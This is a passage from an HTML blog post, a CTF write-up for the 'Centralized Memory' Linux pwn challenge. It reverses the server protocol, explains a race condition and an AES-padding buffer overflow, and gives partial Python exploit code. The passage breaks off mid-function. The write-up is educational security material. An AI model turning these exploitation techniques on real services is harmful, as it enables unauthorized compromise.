@@ -1,0 +1,567 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.120.3"><link rel=canonical href=/posts/ecw-2023-centralized-memory-write-up/><meta property="og:title" content="ECW 2023: Centralized Memory (write-up)"><meta property="og:description" content="Centralized Memory was a hard Linux pwn challenge created for the European Cyber Week CTF 2023 qualifiers. This write-up covers the intended method of exploitation through a race condition, an AES padding bug and a stack overflow."><meta property="og:type" content="article"><meta property="og:url" content="/posts/ecw-2023-centralized-memory-write-up/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-07T12:00:00+01:00"><meta property="article:modified_time" content="2023-11-07T12:00:00+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ECW 2023: Centralized Memory (write-up)"><meta name=twitter:description content="Centralized Memory was a hard Linux pwn challenge created for the European Cyber Week CTF 2023 qualifiers. This write-up covers the intended method of exploitation through a race condition, an AES padding bug and a stack overflow."><meta itemprop=name content="ECW 2023: Centralized Memory (write-up)"><meta itemprop=description content="Centralized Memory was a hard Linux pwn challenge created for the European Cyber Week CTF 2023 qualifiers. This write-up covers the intended method of exploitation through a race condition, an AES padding bug and a stack overflow."><meta itemprop=datePublished content="2023-11-07T12:00:00+01:00"><meta itemprop=dateModified content="2023-11-07T12:00:00+01:00"><meta itemprop=wordCount content="4538"><meta itemprop=keywords content="CTF,Writeup,ECW 2023,Exploit,Linux,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>ECW 2023: Centralized Memory (write-up)
+</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
+<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>ECW 2023: Centralized Memory (write-up)</h1><div class=content><p>This year again, Thalium took part in organizing the <a href=https://www.european-cyber-week.eu/>European Cyber Week</a> CTF qualifiers, as well as designing several challenges in our core competencies.</p><p><strong>Centralized Memory</strong> was a hard Linux pwn challenge that was created for the occasion. In this write-up, we cover the intended method of exploitation.</p><h1 id=introduction>Introduction</h1><p><a href=/posts/img/ecw-2023/centralizedmemory/challenge-desc.png target=_blank><img src=/posts/img/ecw-2023/centralizedmemory/challenge-desc.png alt="Challenge description"></a></p><p>The main idea behind this challenge stemmed from an initial observation: very few CTFs offer the opportunity to work with <strong>race conditions</strong> and <strong>multi-threading issues</strong>.</p><p>Most of the time, this scarcity is due to the inherent difficulty in identifying such bugs, the complex and unpredictable nature of their exploitation, or the strain they impose on the underlying infrastructure.</p><p>Therefore, I wanted to challenge myself by creating something that:</p><ul><li>could be exploited through a simple race condition;</li><li>needed as little work as possible to stabilize and make the exploit reliable;</li><li>(most importantly) would be fun to solve.</li></ul><p>During the ECW qualifiers, the challenge was solved by only 2 players. As it was designed to be difficult, we were expecting that.</p><p>Nevertheless, among the intended vulnerabilities, the binary suffered from an unexpected bug, allowing participants to solve it in a different way (and unfortunately bypass the race condition).</p><p>This illustrates that the development of a challenge can be just as hard as solving it. However, we will not delve into the unintended solution here and will entrust it to the participants&rsquo; discretion. Hence, this write-up will exclusively concentrate on the intended solution.</p><h1 id=challenge-overview>Challenge overview</h1><p>According to the challenge description, we must find a way to execute arbitrary commands on the remote RAM server in order to read the flag on its file system. To do so, we are given a remote access to the RAM server, the server&rsquo;s <a href=/posts/binaries/ecw-2023/centralizedmemory/GS_memory_server>binary</a> and its <a href=/posts/binaries/ecw-2023/centralizedmemory/libc.so.6>libc</a>.</p><p>Using <em>checksec</em>, we find nothing alarming and the provided libc doesn&rsquo;t suffer from any major vulnerability. We can thus begin the reversing part of the binary.</p><pre tabindex=0><code>$ checksec ./GS_memory_server
+RELRO             : Full RELRO
+STACK CANARY      : Canary found 
+NX                : NX enabled 
+PIE               : PIE enabled
+RPATH             : No RPATH
+RUNPATH           : No RUNPATH
+Symbols           : No Symbols
+FORTIFY           : No
+Fortified         : 0     
+Fortifiable       : 5
+FILE              : ./GS_memory_server
+</code></pre><h1 id=reversing-the-communication-protocol>Reversing the communication protocol</h1><p>As suggested in the challenge description, the RAM server uses a proprietary communication protocol that must reversed beforehand.</p><p>The reversing part is quite straightforward, as it is not a reverse challenge. Therefore, we won&rsquo;t go into further detail here.</p><p>Upon reversing the binary, we come up with the following architecture:</p><p><a href=/posts/img/ecw-2023/centralizedmemory/centralized_archi.png target=_blank><img src=/posts/img/ecw-2023/centralizedmemory/centralized_archi.png alt=Architecture></a></p><p>The server architecture is quite simple. Here are some of its key features:</p><ul><li>the main thread is responsible for accepting new connections and creating the associated client thread;</li><li>the client threads are responsible for receiving clients commands, handling them and sending the result to the client;</li><li>the server&rsquo;s memory is shared by all client threads.</li></ul><p>The command dispatcher is located at the offset <code>0x27ca</code>. It handles up to eight different commands. Commands are encoded in a binary format which is described below.</p><h2 id=command-1-malloc>Command 1: Malloc</h2><h3 id=description>Description</h3><p>The <em>malloc</em> command allocates a block of data in the server memory. The size of the block must be provided along with the encryption flag that tells whether or not the block is encrypted. The block size must be non-null and cannot exceed 512 bytes. If the command succeeds, the return status is 0 and the block identifier is returned, otherwise an error code is returned.</p><h3 id=command-request-format>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_malloc_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id;  <span style=color:#75715e>// 0x00 (must be 1)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint16_t</span> block_size;  <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>bool</span> encrypted_block; <span style=color:#75715e>// 0x06
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_malloc_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> block_id;      <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-2-free>Command 2: Free</h2><h3 id=description-1>Description</h3><p>The <em>free</em> command frees a previously allocated block of data given its block identifier. If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-1>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_free_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 2)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> block_id;   <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-1>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_free_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-3-read>Command 3: Read</h2><h3 id=description-2>Description</h3><p>The <em>read</em> command reads the contents of a given block. If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-2>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_read_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 3)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> block_id;   <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-2>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_read_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint16_t</span> data_size;     <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> data[];            <span style=color:#75715e>// 0x06 (the size of the buffer is given by &#34;data_size&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-4-write>Command 4: Write</h2><h3 id=description-3>Description</h3><p>The <em>write</em> command writes the contents of a given block. The data written to the block cannot exceed the block size. If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-3>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_write_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 4)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> block_id;   <span style=color:#75715e>// 0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint16_t</span> data_size;  <span style=color:#75715e>// 0x08
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> data[];         <span style=color:#75715e>// 0x0c (the size of the buffer is given by &#34;data_size&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-3>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_write_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-5-clear>Command 5: Clear</h2><h3 id=description-4>Description</h3><p>The <em>clear</em> command clears the whole memory by deleting all existing blocks. If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-4>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_clear_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 5)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-4>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_clear_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-6-ram-usage>Command 6: RAM usage</h2><h3 id=description-5>Description</h3><p>The <em>usage</em> command returns the RAM usage of the server. If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-5>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_usage_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 6)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-5>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_usage_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status;   <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> remaining_space; <span style=color:#75715e>// 0x04 (in bytes)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-7-ram-defragment>Command 7: RAM defragment</h2><h3 id=description-6>Description</h3><p>The <em>defragment</em> command reorganizes the RAM by filling up holes in the memory (like those of previously freed blocks). If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-6>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_defrag_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 7)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-6>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_defrag_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=command-8-server-info>Command 8: Server info</h2><h3 id=description-7>Description</h3><p>The <em>info</em> command sends server information to the client (such as the owner of the server, the contact email and the server total capacity). If the command succeeds, the return status is 0, otherwise an error code is returned.</p><h3 id=command-request-format-7>Command request format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_info_req {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> command_id; <span style=color:#75715e>// 0x00 (must be 8)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h3 id=command-response-format-7>Command response format</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> cmd_info_resp {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> return_status; <span style=color:#75715e>// 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><h2 id=memory-organization>Memory organization</h2><p>Upon block allocation, a <em>block header</em> is created. It is structured as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> block_header {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bool</span> encrypted;               <span style=color:#75715e>// A boolean to know if the block is encrypted or not
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>struct</span> block_data<span style=color:#f92672>*</span> block_ptr; <span style=color:#75715e>// A pointer to the block data
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><p>This block header is then appended to a block header list named <code>block_headers</code>.</p><p>The block data is structured as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> block_data {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint16_t</span> canary;      <span style=color:#75715e>// A 2-byte canary (derived from the block ID)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint16_t</span> dec_size;    <span style=color:#75715e>// The decrypted size of the block
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint16_t</span> enc_size;    <span style=color:#75715e>// The encrypted size of the block (== dec_size if plaintext)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> id;          <span style=color:#75715e>// The block ID
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> data[]; <span style=color:#75715e>// The actual block data (the size is determined by &#34;enc_size&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
+</span></span></code></pre></div><p>The block data is placed in a large reserved heap space allocated at the server start that represents the RAM of the server.</p><p>The following diagram summarizes it all:</p><p><a href=/posts/img/ecw-2023/centralizedmemory/centralized_memory.png target=_blank><img src=/posts/img/ecw-2023/centralizedmemory/centralized_memory.png alt=Memory></a></p><h2 id=encryption>Encryption</h2><p>Encrypted blocks are encrypted with AES-CBC using the hard-coded key <code>TH3Gr3eNSh4rDk3y</code>.</p><h1 id=vulnerabilities>Vulnerabilities</h1><p>Now that we know how the protocol works and how to interact with the server, we can go through its vulnerabilities.</p><h2 id=step-1-race-condition-on-block-id>Step 1: Race condition on block ID</h2><p>As you may have noticed, the RAM server is capable of handling multiple clients at the same time using different threads.</p><p>Some objects are shared across all threads, and therefore should be protected by a mutex to avoid concurrent accesses to it. Among all commands, only the <strong>malloc</strong> command (1) suffers from such a vulnerability.</p><p>Indeed, here is the faulty code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// [...]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>v2 <span style=color:#f92672>=</span> <span style=color:#f92672>::</span>current_block_id;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>pthread_mutex_lock</span>(<span style=color:#f92672>&amp;</span>mutex);
+</span></span><span style=display:flex><span>block_id <span style=color:#f92672>=</span> <span style=color:#a6e22e>allocate_block</span>(request.block_size, <span style=color:#f92672>::</span>current_block_id, request.encrypted);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>pthread_mutex_unlock</span>(<span style=color:#f92672>&amp;</span>mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>send</span>(client_fd, <span style=color:#f92672>&amp;</span>block_id, <span style=color:#ae81ff>4uLL</span>, <span style=color:#ae81ff>0x4000</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>block_id )
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>send</span>(client_fd, <span style=color:#f92672>&amp;</span>v2, <span style=color:#ae81ff>4uLL</span>, <span style=color:#ae81ff>0x4000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#f92672>++::</span>current_block_id;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// [...]
+</span></span></span></code></pre></div><p>As you can see, the global variable <code>block_id</code> is incremented <em>outside</em> the mutex lock. Therefore, if 2 clients allocate a block at the same time, there is a chance that the resulting blocks have the same ID. For instance:</p><ol><li>Client A sends malloc command</li><li>Client B sends malloc command</li><li>Client B thread enters the <code>allocate_block</code> function with <code>block_id</code> = 0 and <code>block_size</code> = 10</li><li>Client A thread enters the <code>allocate_block</code> function with <code>block_id</code> = 0 and <code>block_size</code> = 20</li><li>Client B thread exits the function and returns the block id 0</li><li>Client B thread increments the <code>block_id</code> variable. <code>block_id</code> is now 1</li><li>Client A thread exits the function and returns the block id 0</li><li>Client A thread increments the <code>block_id</code> variable. <code>block_id</code> is now 2</li></ol><p>So, what can we do next with such a primitive?</p><h2 id=step-2-memory-buffer-overflow>Step 2: Memory buffer overflow</h2><p>I must admit, this one was a bit tricky to find.</p><p>When a block is manipulated, the <code>block_headers</code> list is used to retrieve the block pointer or the encryption flag of the block.</p><p>These 2 informations are retrieved using 2 different functions:</p><ul><li>The encryption flag is retrieved using the function <code>is_block_encrypted</code> (0x1a4c). This function takes a block ID and searches for the <strong>last</strong> block with the same ID in the <code>block_headers</code> list.</li><li>The block pointer is retrieved using the function <code>get_block_ptr</code> (0x1ab4). This function also takes a block ID, but searches for the <strong>first</strong> block with the same ID in the <code>block_headers</code> list.</li></ul><p>Here is the problem: <code>is_block_encrypted</code> uses the <strong>first matching block ID</strong> whereas <code>get_block_ptr</code> uses the <strong>last matching block ID</strong>.</p><p>Strictly speaking, it&rsquo;s not a bug because in an ideal world, the block IDs should be unique. Therefore, in any case, these two functions should use the same block.</p><p>However, with the first bug, this property isn&rsquo;t guaranteed anymore and block confusion can occur.</p><hr><p>Let&rsquo;s say we have created 2 blocks with the same ID like this:</p><ul><li>the first block is a plaintext block of size 11;</li><li>the second block is an encrypted block of size 16, placed just after the first block in the server RAM.</li></ul><p>We then use the <em>write</em> command to write 11 bytes of data to the first block (plaintext).</p><p>The <em>write</em> function checks the encryption flag of the block using <code>is_block_encrypted</code>. Since there are two blocks with the same ID, the function returns the encryption flag of the second block (which is encrypted). The write function will thus think that the first block is encrypted, but this is not the case.</p><p>As a result, data will be encrypted and then written to the block memory. Since AES encryption requires that the data size be a multiple of 16, an extra 5 bytes of padding is appended and the encrypted result is now 16 bytes long.</p><p>Then, when the encrypted data is written, the function <code>get_block_ptr</code> is called to retrieve block address. This time, the first block is used (plaintext). However, the first block size is only 11 bytes long whereas the data to be written is 16 bytes long. This leads to a <strong>buffer overflow</strong> due to encryption padding.</p><p>In order to trigger the bug, the code below finds a suitable layout 100% of the time:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>STATUS_SUCCESS  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>
+</span></span><span style=display:flex><span>STATUS_OVERFLOW <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xC0000008</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>REQ_MALLOC <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>REQ_FREE   <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>REQ_READ   <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>REQ_WRITE  <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>REQ_CLEAR  <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_exploitable_blocks</span>(io: tube, block_ids: List[int], enc_blk_size: int) <span style=color:#f92672>-&gt;</span> List[int]:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Filter block id to find duplicate block id (successful exploitation of the race)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Then, try to find exploitable blocks by trying to write &#34;enc_blk_size&#34; bytes to
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    the first block (when two blocks with the same id exists, the first block is always selected)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    If the write command fails with the code CODE_OVERFLOW this means that we have written in 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    the smaller block, which is what we are looking for
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Search duplicate blocks</span>
+</span></span><span style=display:flex><span>    candidates_blk <span style=color:#f92672>=</span> [block_id <span style=color:#66d9ef>for</span> block_id, count <span style=color:#f92672>in</span> collections<span style=color:#f92672>.</span>Counter(block_ids)<span style=color:#f92672>.</span>items() <span style=color:#66d9ef>if</span> count <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Search candidates where the first block is the plaintext one</span>
+</span></span><span style=display:flex><span>    exploitables_blk <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> candidate_blk_id <span style=color:#f92672>in</span> candidates_blk:
+</span></span><span style=display:flex><span>        io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;III&#34;</span>, REQ_WRITE, candidate_blk_id, enc_blk_size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        status <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(status) <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>and</span> int<span style=color:#f92672>.</span>from_bytes(status, <span style=color:#e6db74>&#34;little&#34;</span>) <span style=color:#f92672>==</span> STATUS_OVERFLOW:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># We have found an exploitable layout (i.e [small plaintext block] -&gt; [big encrypted block])</span>
+</span></span><span style=display:flex><span>            exploitables_blk<span style=color:#f92672>.</span>append(candidate_blk_id)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Wrong block disposition. Send block data to complete the write command</span>
+</span></span><span style=display:flex><span>            io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>            io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> exploitables_blk
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_loop</span>(block_ids: List[int], size: int, encrypted: bool):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The client loop to trigger race condition with exploitable conditions
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> remote(SERVER_ADDR, SERVER_PORT, )
+</span></span><span style=display:flex><span>    block_ids <span style=color:#f92672>+=</span> [client_malloc(io, size, encrypted) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>)]
